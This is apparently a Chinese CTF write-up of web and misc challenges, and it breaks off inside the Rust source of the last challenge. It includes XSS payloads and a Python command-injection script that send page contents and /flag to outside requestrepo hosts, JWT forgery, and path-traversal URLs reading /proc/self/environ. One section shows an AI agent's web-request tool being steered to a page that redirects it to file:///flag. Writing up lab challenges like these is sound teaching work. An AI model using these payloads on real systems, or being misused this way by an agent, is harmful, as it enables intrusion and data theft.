## test nc 
直接
```
nc ip port
```
连接，再
```
cat flag
```
就可以了
## 魔理沙的魔法目录
这一关看控制台每隔一段时间就会记录时间，可以抓一下记录时间的包
```
{"time":10}
```
内容是这个，直接把时间修改为`100000`再放包，时间就够了，就会输出flag
![](/image/337.png)
## Vidarshop
这一关看源码有一个`ctf_token`
通过
```
const ctfToken = localStorage.getItem('ctf_token');

console.log('你的ctf_token：', ctfToken);
```
得到ctf_token，这应该是jwt，所以密钥爆破一下
爆破出密钥是`111`,所以就修改为
```
{
  "username": "admin",
  "role": "admin",
  "exp": 1770006710
}
```
再修改token
```
const myNewToken = "这里替换成你伪造好的那个Admin_Token字符串";  localStorage.setItem('ctf_token', myNewToken); 
location.reload();
```
但是
```
await refreshUserInfo();
```
得到
```
[/api/update] {"is_admin":false,"msg":"Standard user access level.","user_info":{"balance":0,"role":"user","username":"admin"}}
```
发现只是修改了用户名，
可以多注册几个用户发现uid和用户名是有关系的，
- ctftest999 -> 32062051920999
- testuser888 -> 20519202119518888
发现规律：每个字母转换为其在字母表中的位置（a=1, b=2, …, z=26），数字保持不变。
因此admin的UID为：`1413914`（a=1, d=4, m=13, i=9, n=14）
但是直接修改不行，这是一个原型链污染题，
payload
![](image/352.png)
这样就可以修改成功。
再买flag就可以了。
```
{"__init__": {"__globals__": {"balance": 2000000}}}
```



## 博丽神社的绘马挂
这一关
```
<svg/onload=fetch(`https://qp3gj23t.requestrepo.com/`+document.cookie)></svg>
```
是不可以得到cookie的，因为开了httponly
所以
```
<img src=x onerror=\"fetch('/api/archives').then(r=>r.text()).then(t=>fetch('http://d4t0vwzn.requestrepo.com?d='+btoa(t)))\">
```
这是对当前页面的`/api/archives`请求，因为这个界面会返回一些信息，![](/image/338.png)
如果执行了XSS，就会执行这条payload外带信息。
`.then(r=>r.text())`把 HTTP 响应转成字符串,不论是json，html都可以转换成文本，
```
.then(t=>fetch('http://d4t0vwzn.requestrepo.com?d='+btoa(t)))
```
把内容base64编码外带到攻击者服务器。
因为httponly外带cookie几乎不可能，外带的是`/api/archives`的响应内容
```
W3siY29udGVudCI6IlRoZV9TZWNyZXRfSXM6IEhnYW1le1RoRS01ZWNyRVQtMEYtaEBLVVJlMS1qaW5KQTFmZGI2ODczfSIsImlkIjoxMDAxLCJpc19wcml2YXRlIjp0cnVlLCJzdGF0dXMiOiJhcmNoaXZlZCIsInRpbWVzdGFtcCI6IjIwMjQtMDEtMDEgMDA6MDA6MDAiLCJ1c2VybmFtZSI6IlJlaW11In1dCg==
```
解码后是
```
[{"content":"The_Secret_Is: Hgame{ThE-5ecrET-0F-h@KURe1-jinJA1fdb6873}","id":1001,"is_private":true,"status":"archived","timestamp":"2024-01-01 00:00:00","username":"Reimu"}]
```
## My Little Assistant
这一关是一个ai，有两个mcp服务，一个`py_eval`可以RCE，但是禁止了，有一个`py_request`可以访问其他网页
源码
```python
from fastapi import FastAPI, Request  
from fastapi.middleware.cors import CORSMiddleware  
import json  
  
app = FastAPI()  
app.add_middleware(  
    CORSMiddleware,  
    allow_origins=["*"],  
    allow_methods=["*"],  
    allow_headers=["*"],  
)  
  
async def py_eval(code: str):  
    try:  
        local_vars = {}  
        exec(code, {}, local_vars)  
        return {"result": str(local_vars), "status": "success"}  
    except Exception as e:  
        return {"error": str(e), "status": "failed"}  
  
def check_url(url: str) -> bool:  
    if (url.startswith("http") == False): return True  
    return False  
async def py_request(url: str):  
    if (check_url(url)):  
        return {"error": "Unsafe URL"}  
    from playwright.async_api import async_playwright  
    try:  
        async with async_playwright() as p:  
            browser = await p.chromium.launch(  
                headless=True,   
                args=["--no-sandbox",  
                      "--disable-dev-shm-usage",  
                      "--disable-web-security"]  
            )  
              
            context = await browser.new_context()  
            page = await context.new_page()  
  
            response = await page.goto(url, timeout = 10000, wait_until = "networkidle")  
            content = await page.content()  
              
            result = {  
                "status_code": response.status if response else None,  
                "content": content[:300]  
            }  
              
            await browser.close()  
  
            return result  
              
    except Exception as e:  
        return {"error": str(e)}  
      
TOOLS = {"py_eval": py_eval, "py_request": py_request}  
  
@app.post("/mcp")  
async def mcp_handler(request: Request):  
    data = await request.json()  
    params = data.get("params", {})  
    name = params.get("name")  
    args = params.get("arguments", {})  
      
    if name in TOOLS:                              
        result = await TOOLS[name](**args)  
        return {  
            "jsonrpc": "2.0",  
            "id": data.get("id"),  
            "result": {"content": [{"type": "text", "text": json.dumps(result)}]}  
        }  
    return {"error": "Tool not found"}  
  
if __name__ == "__main__":  
    import uvicorn  
    uvicorn.run(app, host="0.0.0.0", port=8001)
```
所以着重看`py_request`
```python
args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-web-security"]
```
这里的`--disable-web-security`它会关闭 Chromium 的**同源策略 (Same-Origin Policy)**。所以可以访问跨域请求
虽然限制只可以用http协议，但是如果在我的VPS写一个html文件
```html
<script>
    // 直接让浏览器跳转到文件协议
    window.location.href = "file:///flag";
</script>
```
让ai去访问这个文件，页面执行会跳转到`file:///flag` `page.content()` 返回的将不再是HTML内容，而是**浏览器渲染出的文件内容**，这样就得到了flag。

## MyMonitor
这一题源码很多，直接交给ai分析了。主要考察的是 **`sync.Pool` 的对象污染（Object Pollution）** 以及 **Gin 框架的数据绑定机制**。
漏洞点在于 `handler.go` 中 `UserCmd` 和 `AdminCmd` 对 `MonitorStruct` 对象的获取、使用和回收逻辑，结合 `defer` 的执行顺序问题。
先看`sync.Pool` 的脏对象回收
```go
func UserCmd(c *gin.Context) {
    monitor := MonitorPool.Get().(*MonitorStruct) // [1] 从池中获取对象（可能是脏的）
    defer MonitorPool.Put(monitor) // [2] 注册 defer：函数结束时放回池中
    // [3] 绑定 JSON 数据
    if err := c.ShouldBindJSON(monitor); err != nil {
        fmt.Println(monitor)
        c.JSON(400, gin.H{"error": err.Error()})
        return // [4] 绑定失败，直接返回
    }
    fmt.Println(monitor)
    // [5] 只有成功绑定后，才注册 reset 的 defer
    defer monitor.reset()
    if monitor.Cmd != "status" {
        c.JSON(403, gin.H{"response": "No permission to execute this command"})
        return
    }
    c.JSON(400, gin.H{"response": "Not implemented yet :("})
    return
}
```
攻击者调用 `/api/user/cmd` `MonitorPool.Get()` 获取一个对象。攻击者发送恶意的 JSON，使得 `c.ShouldBindJSON(monitor)` **部分成功但最终返回错误**。进入 `if err != nil` 分支，函数执行 `return`。`defer monitor.reset()` 还没有被注册（因为它在 `if` 之后）。`defer MonitorPool.Put(monitor)` 执行。**结果**一个带有攻击者数据的“脏对象”被放回了 `MonitorPool`，且没有被重置。
而机器人呢，后台机器人可能一直调用`/api/admin/cmd`，通常这种 Bot 发送的 JSON 可能是： `{"cmd": "ls"}`
而根据定义
```go
type UserStruct struct {
    Username string `json:"username" binding:"required"`
    Password string `json:"password" binding:"required"`
}
```
如果 Bot 发送的 JSON 中**没有 `args` 字段**，Go 的 JSON Unmarshal **不会**去覆盖 struct 中已有的 `Args` 字段，而是保持原样。
所以只要疯狂请求 `UserCmd`，发送 payload 设定 `Args` 字段，但故意不传 `Cmd` 字段（触发 `required` 错误）。这样脏对象（Cmd为空，Args为恶意命令）就会填满 `sync.Pool`。
Admin Bot 发起请求，恰好从池中拿到了这个脏对象。
Bot 的 JSON `{"cmd": "ls"}` 被绑定。`monitor.Cmd` 被覆盖为 `"ls"`。`monitor.Args` **未被覆盖**，保留了攻击者注入的恶意命令（例如 `; cat /flag`）。
代码执行：`exec.Command("bash", "-c", "ls ; cat /flag")`。
脚本
```python
import requests  
import threading  
import time  
  
# 目标 URL
TARGET_URL = "http://cloud-middle.hgame.vidar.club:32155"  
# 你的监听服务器 (用于接收 Flag)
MY_SERVER = "http://5215q43f.requestrepo.com/"  
  
  
# 1. 注册并登录获取 Tokendef get_token():  
    s = requests.Session()  
    username = f"hacker_{time.time()}"  
    password = "password123"  
  
    # 注册  
    reg_res = s.post(f"{TARGET_URL}/api/account/register", json={  
        "username": username,  
        "password": password  
    })  
  
    # 也可以直接从注册返回中拿 Token，或者登录拿  
    if "Authorization" in reg_res.json():  
        return reg_res.json()["Authorization"]  
  
    # 登录  
    login_res = s.post(f"{TARGET_URL}/api/account/login", json={  
        "username": username,  
        "password": password  
    })  
    return login_res.json()["Authorization"]  
  
  
token = get_token()  
print(f"[*] Got Token: {token}")  
  
# 2. 构造 Payload# 利用 ; 分隔符执行第二条命令  
# 如果不知道 flag 位置，可以尝试 /flag, ./flag, /root/flag 等  
cmd_injection = f"; curl {MY_SERVER}`cat /flag | base64 | tr -d '\n' | tail -c 20`"  
  
# 故意缺省 cmd 字段以触发 binding errorpayload = {  
    "args": cmd_injection  
}  
  
headers = {  
    "Authorization": token,  
    "Content-Type": "application/json"  
}  
  
  
# 3. 疯狂发送请求污染 sync.Pooldef pollute():  
    while True:  
        try:  
            # 发送请求，期望返回 400 Error (binding error)            # 这会将带有我们 args 的脏对象放回池中  
            requests.post(f"{TARGET_URL}/api/user/cmd", json=payload, headers=headers)  
        except:  
            pass  
  
  
print("[*] Starting pollution... Check your listener!")  
  
# 开启多线程增加竞争成功率  
for i in range(10):  
    t = threading.Thread(target=pollute)  
    t.start()
```
运行脚本就可以在服务器收到flag了，但是这里有一个问题就是flag很长，得到flag不完整，可以先
```
curl http://ip:port `cat /flag | base64`
再
; curl {MY_SERVER}`cat /flag | base64 | tr -d '\n' | tail -c 20` 输出后20位
```
拼接得到flag
```
hgame{reM3mB3R_t0_CI34r-tH3_bUFfeR_63fORe-Y0u_Want-to_Us3!!!0}
```
当然这道题也可以直接手动发送也是可以的。
## 打好基础
这一关一堆emoji符号，可以用base100解码，解码后得到的东西应该是base混合编码，直接丢到随波逐流里，解出来是
经过Base92 -> Base91 -> Ascii85 -> Base64 -> Base62 -> Base58 -> Base45 -> Base32
```
hgame{L4y_a_sO11d_f0unDaTi0n}
```
## easyuu
这道题在文件上传后可以访问到`/api/list_dir` 默认path=.%2Fuploads
但是这个可以修改，利用目录穿越列出其他目录，例如`path=../`就可以列出根目录，
利用这个可以知道`/app/update`目录下有`easyuu.zip`文件，可以利用`/api/upload_file/`来下载，访问
```
http://1.116.118.188:31853/api/download_file/..%2fupdate%2feasyuu.zip
```
就可以下载到所有源码，尝试git还原一下
```
git log
```
发现有一个`print flag`
再
```
git show ba6b780d13a9fbda2cc68a6e1276b9c5f4a1f25c
git show 974d1964e1bd1e6c23ef4e1ac925af0cd1428200
```
得到
```
diff --git a/src/app.rs b/src/app.rs
index dfcdfd8..6789183 100644
--- a/src/app.rs
+++ b/src/app.rs
@@ -219,14 +219,6 @@ pub fn UploadFile() -> impl IntoView {
     }
 }

-#[component]
-fn PrintFlag() -> impl IntoView {
-    use std::env;
-    let flag = env::var("FLAG").unwrap_or_default();
-
-    view! { <p>{flag}</p> }
-}
-
 #[component]
 pub fn App() -> impl IntoView {
     // Provides context that manages stylesheets, titles, meta tags, etc.
@@ -263,7 +255,6 @@ fn HomePage() -> impl IntoView {
     view! {
         <h1>"Welcome to Hgame web file explorer!"</h1>
         <h2>"Directory listing for /uploads"</h2>
```
发现flag藏在环境变量里
```
http://1.116.118.188:30711/api/download_file/..%2f..%2fproc%2fself%2fenviron
```
可以读取环境变量。但他是空的。
也可以下载easyuu.zip，这是源码文件。
可以通过
```
http://1.116.118.188:30711/api/download_file/..%2f..%2fapp%2fupdate%2feasyuu
```
来下载easyuu，这是一个二进制文件。
看源码可以得知，在/api/upload_file 里有一个phth1参数可以控制文件上传路径，
文件上传时可以添加进去。
![](/image/348.png)
这样就可以上传得到其他目录了。
可以上传到`/app/update`文件下，在`/app/update`下有一个`easyuu`的二进制文件，这个是可以自动执行的，如果写一个新的easyuu文件把原来的覆盖掉，就可以执行命令了。
写一个rs文件
```rust
use std::fs;
use std::env;

fn main() {
    // 1. 获取所有环境变量并拼接
    let envs: String = env::vars().map(|(k, v)| format!("{}={}\n", k, v)).collect();

    // 2. 写入文件（写入到 uploads 方便下载，/proc/self 下通常无法直接新建文件）
    let _ = fs::write("./uploads/envflag.txt", envs);

    // 3. 必须输出一个版本号，防止主进程报错
    println!("0.0.0");
}
```
这个可以执行env并把结果输出到`./uploads/envflag.txt`方便下载，
对这个rs文件进行编译
```
rustc --target x86_64-unknown-linux-gnu 567.rs -o env_write
```
上传时文件名要改成`easyuu`，路径可以由`path1`决定。执行后就可以看到![](/image/349.png)
下载就可以看到flag。

## Invest on Matrix
这一关把全部hint都买下后是这些
```
1 pts 
1 1 1 1 1 1 0 0 0 0 1 0 1 1 1 1 0 1 1 1 1 0 1 1 1
2 pts
1 1 0 1 1 0 1 0 1 1 0 1 0 1 0 0 1 0 0 0 0 1 0 0 1
3 pts
0 0 1 0 0 1 1 1 0 1 0 0 0 1 1 0 1 1 0 1 0 1 1 0 0
4 pts
0 0 0 1 1 0 0 0 1 0 1 1 0 1 0 1 1 0 1 0 0 0 0 1 0
5 pts
1 1 1 1 1 0 0 0 0 1 1 1 1 0 1 1 1 1 0 1 1 1 1 0 1
6 pts
1 0 0 0 0 1 1 1 1 1 0 0 0 0 0 0 0 1 1 1 1 0 1 0 0
7 pts
0 1 0 1 0 1 1 0 1 0 0 0 0 1 0 0 1 0 1 0 1 0 1 0 1
8 pts
0 0 1 1 0 1 0 1 0 1 0 1 1 1 1 0 0 1 0 0 0 1 0 0 1
9 pts
1 0 0 1 0 0 1 0 1 1 0 0 0 0 0 1 1 1 1 1 1 1 0 1 0
10 pts
0 0 0 0 1 1 1 1 1 1 0 0 0 0 0 0 0 1 1 1 0 1 0 1 1
11 pts
1 1 0 1 1 1 1 1 0 1 0 1 1 0 0 1 0 0 0 1 1 0 0 1 1
12 pts
1 1 0 1 1 0 0 1 1 0 1 1 0 1 0 0 0 0 0 1 1 1 1 1 0
13 pts
1 1 0 1 0 0 0 1 0 1 1 1 1 1 0 1 1 0 1 1 1 0 0 1 0
14 pts
1 1 1 0 1 0 0 0 0 1 1 0 1 0 1 1 1 0 1 0 0 0 0 1 0
15 pts
1 1 1 1 1 1 0 0 0 1 1 0 0 0 1 0 0 0 1 0 0 1 0 0 1
16 pts
1 0 1 0 1 1 0 1 0 1 0 0 0 0 0 1 1 1 1 1 1 0 0 0 0
17 pts
0 0 0 1 0 0 1 0 1 1 0 0 0 1 0 1 1 0 0 0 0 1 0 0 0
18 pts
1 1 1 0 1 0 0 1 1 1 1 0 0 0 1 1 1 0 0 1 0 1 1 1 1
19 pts
0 1 1 1 1 0 1 1 1 1 0 1 0 0 0 1 1 0 1 0 1 1 0 0 0
20 pts
0 0 0 1 0 1 1 0 1 1 1 1 1 1 1 1 1 0 1 1 1 0 0 1 1
21 pts
1 0 1 1 1 1 0 1 1 1 1 0 1 1 1 1 0 0 0 0 1 1 1 1 1
22 pts
0 1 0 1 1 0 1 0 1 1 0 1 0 1 0 0 1 0 0 1 1 1 0 0 1
23 pts
1 1 0 1 0 1 0 0 1 1 1 1 0 0 1 1 0 1 1 0 1 0 0 0 1
24 pts
1 1 1 1 1 0 0 0 1 1 1 0 1 1 1 1 0 1 0 1 0 1 0 0 0
25 pts
1 0 0 0 0 0 0 1 0 1 0 0 1 0 1 0 1 0 0 1 0 0 1 1 1
```
因为题目说是25x25并且hint里全是0 1 基本确定是二维码，
接下来就要按题目说的规则还原二维码了。
```python
import numpy as np  
from PIL import Image  
  
blocks = [  
# 1 pts  
[1,1,1,1,1,1,0,0,0,0,1,0,1,1,1,1,0,1,1,1,1,0,1,1,1],  
# 2 pts  
[1,1,0,1,1,0,1,0,1,1,0,1,0,1,0,0,1,0,0,0,0,1,0,0,1],  
# 3 pts  
[0,0,1,0,0,1,1,1,0,1,0,0,0,1,1,0,1,1,0,1,0,1,1,0,0],  
# 4 pts  
[0,0,0,1,1,0,0,0,1,0,1,1,0,1,0,1,1,0,1,0,0,0,0,1,0],  
# 5 pts  
[1,1,1,1,1,0,0,0,0,1,1,1,1,0,1,1,1,1,0,1,1,1,1,0,1],  
# 6 pts  
[1,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,1,1,1,1,0,1,0,0],  
# 7 pts  
[0,1,0,1,0,1,1,0,1,0,0,0,0,1,0,0,1,0,1,0,1,0,1,0,1],  
# 8 pts  
[0,0,1,1,0,1,0,1,0,1,0,1,1,1,1,0,0,1,0,0,0,1,0,0,1],  
# 9 pts  
[1,0,0,1,0,0,1,0,1,1,0,0,0,0,0,1,1,1,1,1,1,1,0,1,0],  
# 10 pts  
[0,0,0,0,1,1,1,1,1,1,0,0,0,0,0,0,0,1,1,1,0,1,0,1,1],  
# 11 pts  
[1,1,0,1,1,1,1,1,0,1,0,1,1,0,0,1,0,0,0,1,1,0,0,1,1],  
# 12 pts  
[1,1,0,1,1,0,0,1,1,0,1,1,0,1,0,0,0,0,0,1,1,1,1,1,0],  
# 13 pts  
[1,1,0,1,0,0,0,1,0,1,1,1,1,1,0,1,1,0,1,1,1,0,0,1,0],  
# 14 pts  
[1,1,1,0,1,0,0,0,0,1,1,0,1,0,1,1,1,0,1,0,0,0,0,1,0],  
# 15 pts  
[1,1,1,1,1,1,0,0,0,1,1,0,0,0,1,0,0,0,1,0,0,1,0,0,1],  
# 16 pts  
[1,0,1,0,1,1,0,1,0,1,0,0,0,0,0,1,1,1,1,1,1,0,0,0,0],  
# 17 pts  
[0,0,0,1,0,0,1,0,1,1,0,0,0,1,0,1,1,0,0,0,0,1,0,0,0],  
# 18 pts  
[1,1,1,0,1,0,0,1,1,1,1,0,0,0,1,1,1,0,0,1,0,1,1,1,1],  
# 19 pts  
[0,1,1,1,1,0,1,1,1,1,0,1,0,0,0,1,1,0,1,0,1,1,0,0,0],  
# 20 pts  
[0,0,0,1,0,1,1,0,1,1,1,1,1,1,1,1,1,0,1,1,1,0,0,1,1],  
# 21 pts  
[1,0,1,1,1,1,0,1,1,1,1,0,1,1,1,1,0,0,0,0,1,1,1,1,1],  
# 22 pts  
[0,1,0,1,1,0,1,0,1,1,0,1,0,1,0,0,1,0,0,1,1,1,0,0,1],  
# 23 pts  
[1,1,0,1,0,1,0,0,1,1,1,1,0,0,1,1,0,1,1,0,1,0,0,0,1],  
# 24 pts  
[1,1,1,1,1,0,0,0,1,1,1,0,1,1,1,1,0,1,0,1,0,1,0,0,0],  
# 25 pts  
[1,0,0,0,0,0,0,1,0,1,0,0,1,0,1,0,1,0,0,1,0,0,1,1,1],  
]  
  
M = np.zeros((25,25), dtype=np.uint8)# 创建一个空的25x25矩阵  
  
for i, b in enumerate(blocks):# i对应hint编号 0-24 b对应25个0/1  
    r = (i // 5) * 5  
    c = (i % 5) * 5  
    M[r:r+5, c:c+5] = np.array(b).reshape(5,5)# 把list变成5x5的数组  
  
# 0/1 → 0/255  
img = Image.fromarray(M * 255) #0对应黑 1对应白  
img = img.resize((250, 250), Image.NEAREST)  # 放大方便扫码  
img.save("qr.png")  
  
print("已生成 qr.png，直接用手机或扫码工具扫它")
```
生成的二维码扫一下拿到flag。
## 《文文。新闻》
目标有两个服务，
- App/Proxy:http://forward.vidar.club:30337/
- Backend:http://forward.vidar.club:30496/
可以看到源代码里有一个@vite的文件夹，说明前端是用的Vite dev server，可以试一下是否有`@fs`任意文件读取漏洞。通过
```
http://forward.vidar.club:31348/@fs/app/frontend/proxy.js
http://forward.vidar.club:31348/@fs/app/backend/src/main.rs
http://forward.vidar.club:32160/@fs/proc/self/environ?import&raw??
```
读取`/proc/self/environ`可以看到:/app/frontend和/app/backend

proxy.js
```js
import http from 'http';
import httpProxy from 'http-proxy';

const RUST_TARGET = 'http://127.0.0.1:3000';
const VITE_TARGET = 'http://127.0.0.1:5173';

const proxy = httpProxy.createProxyServer({
  agent: new http.Agent({ 
    keepAlive: true, 
    maxSockets: 100,
    keepAliveMsecs: 10000 
  }),
  xfwd: true,
});

proxy.on('error', (err, req, res) => {
  console.error('[Proxy Error]', err.message);
  if (res && !res.headersSent) {
    try { res.writeHead(502); res.end('Bad Gateway'); } catch(e){}
  }
});

const server = http.createServer((req, res) => {
  if (req.url.startsWith('/api/')) {
    proxy.web(req, res, { target: RUST_TARGET });
  } else {
    proxy.web(req, res, { target: VITE_TARGET });
  }
});

console.log("馃敟 Node.js Dumb Proxy running on port 80");
server.listen(80);
```
main.rs
```rust
mod http_parser;
mod handlers;
use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use bytes::{BytesMut, Buf};
use http_parser::ParseResult;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>>{
    let listener = TcpListener::bind("0.0.0.0:3000").await?;
    println!("server running on 127.0.0.1:3000");
  
    loop {
        let (socket, _) = listener.accept().await?;

        tokio::spawn(async move {
            if let Err(e) = process_connection(socket).await {
                eprintln!("Connection error: {}", e);
            }
        });
    }
}
async fn process_connection(mut socket: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
    let mut buffer = BytesMut::with_capacity(4096);

    loop {
        let n = socket.read_buf(&mut buffer).await?;
  
        if n == 0 {
            if buffer.is_empty() {

                return Ok(());
            } else {
                eprintln!("Connection closed with {} bytes remaining (garbage)", buffer.len());
                return Ok(());
            }
        }
        loop {
            match http_parser::parse_packet(&mut buffer) {
                ParseResult::Complete(req, consumed_len) => {
                    println!("Parsed request: {} {}", req.method, req.route);
                    let response = router(&req);
                    socket.write_all(response.as_bytes()).await?;
                    buffer.advance(consumed_len);
                }
                ParseResult::Partial => {
                    break;
                }
                ParseResult::Invalid(skip_len) => {
                    println!("Warning: Skipping {} bytes of garbage data...", skip_len);
                    // }
                    buffer.advance(skip_len);
                    if buffer.is_empty() {
                        break;
                    }
                }
            }
        }
    }
}

fn router(req: &http_parser::Request) -> String {
    if req.version != "HTTP/1.1" {
        return handlers::resp_err("400 Bad Request", "Wrong HTTP Version. Only HTTP/1.1 is supported.");
    }
  
    if !req.queries.is_empty() {
        println!("  -> Query params: {:?}", req.queries);
    }

    match req.route.as_str() {
        "/api/register" => handlers::handle_register(req),
        "/api/login" => handlers::handle_login(req),
        "/api/comment" => handlers::handle_comment(req),
        _ => handlers::resp_not_found(),
    }
}
```
handlers.rs
```rust
use crate::http_parser::Request;
use std::sync::Mutex;
use std::collections::HashMap;
use serde::{Deserialize, Serialize};
use lazy_static::lazy_static;
use uuid::Uuid;

lazy_static! {
    static ref USERS: Mutex<HashMap<String, UserRecord>> = Mutex::new(HashMap::new());
    static ref COMMENTS: Mutex<Vec<CommentData>> = Mutex::new(Vec::new());
}

#[derive(Deserialize)]
struct AuthRequest {
    username: String,
    password: String,
}
  
#[derive(Clone)]
struct UserRecord {
    password: String,
    token: String,
}

#[derive(Serialize, Deserialize, Clone)]

struct CommentData {

    username: String,

    content: String,

}

  

fn make_resp(status: &str, body: &str) -> String {

    format!(

        "HTTP/1.1 {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}",

        status, body.len(), body

    )

}

  

fn resp_ok(msg: &str) -> String {

    make_resp("200 OK", msg)

}

  

pub fn resp_err(status: &str, msg: &str) -> String {

    make_resp(status, &format!(r#"{{"error": "{}"}}"#, msg))

}

  

pub fn handle_register(req: &Request) -> String {

    if req.method != "POST" { return resp_err("405 Method Not Allowed", "Only POST"); }

  

    let content_type = req.headers.get("content-type").map(|s| s.as_str()).unwrap_or("");

    let form: AuthRequest = if content_type.contains("application/json") {

        match req.parse_json() {

            Ok(d) => d,

            Err(_) => return resp_err("400 Bad Request", "Invalid JSON format"),

        }

    } else if content_type.contains("application/x-www-form-urlencoded") {

        let map = req.parse_form();

        let username = map.get("username").cloned().unwrap_or_default();

        let password = map.get("password").cloned().unwrap_or_default();

  

        if username.is_empty() || password.is_empty() {

             return resp_err("400 Bad Request", "Missing username or password");

        }

  

        AuthRequest { username, password }

    } else {

        return resp_err("415 Unsupported Media Type", "Content-Type must be json or form");

    };

  

    let mut db = USERS.lock().unwrap();

    if db.contains_key(&form.username) {

        return resp_err("409 Conflict", "User already exists");

    }

    let new_token = Uuid::new_v4().to_string();

    db.insert(

        form.username.clone(),

        UserRecord {

            password: form.password,

            token: new_token.clone(),

        }

    );

    println!("User registered: {} with token: {}", form.username, new_token);

  

    resp_ok(&format!(r#"{{"status": "registered", "token": "{}"}}"#, new_token))

}

  

pub fn handle_login(req: &Request) -> String {

    if req.method != "POST" { return resp_err("405 Method Not Allowed", "Only POST"); }

  

    let content_type = req.headers.get("content-type").map(|s| s.as_str()).unwrap_or("");

    let form: AuthRequest = if content_type.contains("application/json") {

        match req.parse_json() {

            Ok(d) => d,

            Err(_) => return resp_err("400 Bad Request", "Invalid JSON format"),

        }

    } else if content_type.contains("application/x-www-form-urlencoded") {

        let map = req.parse_form();

        let username = map.get("username").cloned().unwrap_or_default();

        let password = map.get("password").cloned().unwrap_or_default();

  

        if username.is_empty() || password.is_empty() {

            return resp_err("400 Bad Request", "Missing username or password");

        }

  

        AuthRequest { username, password }

    } else {

        return resp_err("415 Unsupported Media Type", "Content-Type must be json or form");

    };

  

    let db = USERS.lock().unwrap();

    if let Some(record) = db.get(&form.username) {

        if record.password == form.password {

            return resp_ok(&format!(r#"{{"status": "success", "token": "{}"}}"#, record.token));

        }

    }

    resp_err("401 Unauthorized", "Invalid credentials")

}

  

pub fn handle_comment(req: &Request) -> String {

    let auth_header = req.headers.get("authorization").map(|v| v.as_str());

    if auth_header.is_none() {

        return resp_err("401 Unauthorized", "Missing Authorization header");

    }

    let input_token = auth_header.unwrap();

    let mut current_user = String::new();

    {

        let db = USERS.lock().unwrap();

        for (username, record) in db.iter() {

            if record.token == input_token {

                current_user = username.clone();

                break;

            }

        }

    }

  

    if current_user.is_empty() {

        return resp_err("403 Forbidden", "Invalid Token");

    }

  

    match req.method.as_str() {

        "GET" => {

            let db = COMMENTS.lock().unwrap();

            let json = serde_json::to_string(&*db).unwrap_or("[]".to_string());

            resp_ok(&json)

        },

  

        "POST" => {

            #[derive(Deserialize)]

            struct NewComment { content: String }

            let content_type = req.headers.get("content-type").map(|s| s.as_str()).unwrap_or("");

            let new_comment: NewComment = if content_type.contains("application/json") {

                match req.parse_json() {

                    Ok(p) => p,

                    Err(_) => return resp_err("400 Bad Request", "Invalid JSON"),

                }

            } else if content_type.contains("application/x-www-form-urlencoded") {

                let map = req.parse_form();

  

                let content = map.get("content").cloned().unwrap_or_default();

  

                if content.is_empty() {

                    return resp_err("400 Bad Request", "Missing content");

                }

  

                NewComment { content }

            } else {

                return resp_err("415 Unsupported Media Type", "Content-Type must be json or form");

            };

  

            let mut comments = COMMENTS.lock().unwrap();

  

            println!("[HANDLER] Saving comment: {:?}", new_comment.content);

            comments.push(CommentData {

                username: current_user,

                content: new_comment.content,

            });

  

            resp_ok(r#"{"status": "comment added"}"#)

        },

        _ => resp_err("405 Method Not Allowed", "Method not supported"),

    }

}

  

pub fn resp_not_found() -> String {

    resp_err("404 Not Found", "Resource not found")

}
```
http_parser.rs
```rust
use bytes::BytesMut;

use std::{collections::HashMap, str};

use serde::Deserialize;

  

#[derive(Debug)]

pub struct Request {

    pub method: String,

    pub route: String,

    pub queries: HashMap<String, String>,

    pub version: String,

    pub headers: HashMap<String, String>,

    pub body: String

}

  

pub enum ParseResult {

    Complete(Request, usize),

    Partial,

    Invalid(usize),

}

  

impl Request {

    pub fn parse_form(&self) -> HashMap<String, String> {

        let mut map = HashMap::new();

        for pair in self.body.split('&') {

            if let Some((k, v)) = pair.split_once('=') {

                if !k.is_empty() {

                    map.insert(k.to_string(), v.to_string());

                }

            } else if !pair.is_empty() {

                map.insert(pair.to_string(), "".to_string());

            }

        }

        map

    }

  

    pub fn parse_json<T: for<'a> Deserialize<'a>>(&self) -> Result<T, serde_json::Error> {

        serde_json::from_str(&self.body)

    }

}

  

pub fn parse_packet(buffer: &mut BytesMut) -> ParseResult {

    let req_line_end = match buffer.windows(2).position(|w| w == b"\r\n") {

        Some(pos) => pos,

        None => return ParseResult::Partial,

    };

  

    let req_line_len = req_line_end + 2;

    let raw_req_line = match str::from_utf8(&buffer[..req_line_end]) {

        Ok(s) => s,

        Err(_) => return ParseResult::Invalid(req_line_len),

    };

  

    let (method, route, queries, version) = match parse_reqline(raw_req_line) {

        Some(res) => res,

        None => return ParseResult::Invalid(req_line_len),

    };

  

    let header_end = match buffer.windows(4).position(|w| w == b"\r\n\r\n") {

        Some(pos) => pos,

        None => return ParseResult::Partial,

    };

  

    let raw_headers = match str::from_utf8(&buffer[req_line_len..header_end]) {

        Ok(s) => s,

        Err(_) => return ParseResult::Invalid(header_end + 4),

    };

    let headers = parse_headers(raw_headers);

  

    let body_length: usize = headers

        .get("content-length")

        .and_then(|v| v.parse().ok())

        .unwrap_or(0);

  

    let total_len = header_end + 4 + body_length;

    if buffer.len() < total_len {

        return ParseResult::Partial;

    }

  

    let body_start = header_end + 4;

    let body_end = body_start + body_length;

    let body = str::from_utf8(&buffer[body_start..body_end]).unwrap_or("").to_string();

  

    ParseResult::Complete(

        Request {

            method,

            route,

            queries,

            version,

            headers,

            body,

        },

        total_len

    )

}

  

fn parse_headers(raw_headers: &str) -> HashMap<String, String> {

    let lines = raw_headers.lines();

    let mut headers: HashMap<String, String> = HashMap::new();

    for line in lines {

        if let Some((k, v)) = line.split_once(":") {

            if !k.is_empty() {

                headers.insert(

                    k.trim().to_lowercase(),

                    v.trim().to_string()

                );

            }

        }

    }

    headers

}

  

fn parse_reqline(raw_req_line: &str) -> Option<(String, String, HashMap<String, String>, String)> {

    let mut raw_req_parts = raw_req_line.split_whitespace();

    let method = raw_req_parts.next()?.to_string();

    let raw_uri = raw_req_parts.next()?;

    let (path, queries) = parse_uri(raw_uri);

    let version = raw_req_parts.next()?.to_string();

    Some((method, path, queries

, version))

}

  

fn parse_uri(raw_uri: &str) -> (String, HashMap<String, String>) {

    let (path, raw_query) = match raw_uri.split_once("?") {

        Some((p, q)) => (p, q),

